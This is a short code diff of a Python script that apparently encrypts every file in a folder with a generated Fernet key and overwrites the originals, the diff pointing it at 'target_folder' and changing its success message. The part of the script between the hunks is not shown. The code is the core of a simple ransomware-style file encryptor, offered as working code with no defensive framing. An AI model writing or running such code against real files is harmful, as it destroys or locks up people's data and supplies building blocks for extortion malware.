@@ -1,6 +1,8 @@
 import os
 from cryptography.fernet import Fernet
 
+os.chdir("target_folder")
+
 files = []
 key = Fernet.generate_key()
 
@@ -22,4 +24,4 @@ for file in files:
 	with open(file, "wb") as thefile:
 		thefile.write(contents_encrypted)
 
-print("Your files have been successfully encrypted!")
+print("All files within the target folder have been successfully encrypted!")
